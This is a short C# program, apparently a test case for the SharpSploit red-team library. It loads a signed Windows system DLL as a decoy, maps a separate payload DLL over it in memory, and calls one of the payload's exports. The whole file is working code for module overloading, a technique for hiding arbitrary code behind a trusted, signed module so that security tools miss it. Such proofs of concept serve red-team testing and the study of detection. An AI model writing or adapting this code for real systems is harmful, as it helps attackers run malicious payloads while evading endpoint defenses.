using System;
using System.Runtime.InteropServices;

namespace SpTestcase
{
    class Program
    {
        // Define a delegate for our payload DLL
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void TestFunc();

        static void Main(string[] args)
        {
            // Details
            String testDetail = @"
            #=================>
            # Hello there!
            # I load a signed module into memory, I
            # then manually map a payload DLL over
            # that module and call one of it's
            # exports.
            #=================>
            ";
            Console.WriteLine(testDetail);

            // Manually stomp module in memory
            // |-> byte[] overload is also available for in-line loading
            String Payload = @"C:\Users\b33f\Tools\Dll-Template\DLL-Template\x64\Release\Dll-Template.dll";
            SharpSploit.Execution.PE.PE_MANUAL_MAP OverloadMeta = SharpSploit.Execution.DynamicInvoke.Generic.OverloadModule(Payload, @"C:\WINDOWS\System32\Windows.Storage.ApplicationData.dll");
            Console.WriteLine("[?] Decoy module     : " + OverloadMeta.DecoyModule);
            Console.WriteLine("[+] Overloading at   : " + String.Format("{0:X}", (OverloadMeta.ModuleBase).ToInt64()));
            if (OverloadMeta.PEINFO.Is32Bit)
            {
                Console.WriteLine("[+] Mapped module is : x86");
            }
            else
            {
                Console.WriteLine("[+] Mapped module is : x64");
            }

            // Call the executable by it's entry point
            Console.WriteLine("\n[*] Calling mapped module by export..\n");
            object[] FunctionArgs = { };
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(OverloadMeta.PEINFO, OverloadMeta.ModuleBase, "test", typeof(TestFunc), FunctionArgs);

            // Keep the main thread running..
            while (true)
            {
                System.Threading.Thread.Sleep(2000);
            }
        }
    }
}